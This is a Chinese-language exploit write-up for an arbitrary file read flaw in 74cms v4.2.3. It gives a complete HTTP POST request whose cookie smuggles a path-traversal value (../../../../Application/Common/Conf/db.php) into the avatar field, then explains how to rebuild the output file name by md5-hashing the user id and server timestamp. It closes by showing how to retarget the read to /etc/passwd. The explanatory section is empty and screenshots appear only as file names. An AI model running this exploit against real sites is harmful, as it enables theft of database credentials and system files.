74cms v4.2.3任意文件读取
========================

一、漏洞简介
------------

二、漏洞影响
------------

74cms v4.2.3

三、复现过程
------------

先尝试读取 db.php，向服务器post如下数据

    POST /index.php?m=&c=members&a=register HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
    Content-Type: application/x-www-form-urlencoded

    ajax=1®_type=2&utype=2&org=bind&ucenter=bind

会返回如下数据

1.png

在/data/upload/avatar/年月/日文件夹下 会生成一张图片

2.png

这张图片的名称由id和时间戳的md5值构成，我们可以将Burp
Suite上返回的时间转换为时间戳

3.png

不过这个时间可能会有误差，如果不行就把时间+-10

我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密

4.png

成功获取图片名，然后访问

    https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg 

保存该图片用文本打开就是 db.php 的内容。

###### PS:

使用post提交，参数如下

5.png

在Header可获取到时间戳

6.png

### 可能会遇到的问题

###### post数据返回unicode编码

因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。

###### 读取其他文件

../../../../Application/Common/Conf/db.php

是读取db.php，如果想读取根目录可以构造

../../../../../../../../etc/passwd

###### 时间戳问题

服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可
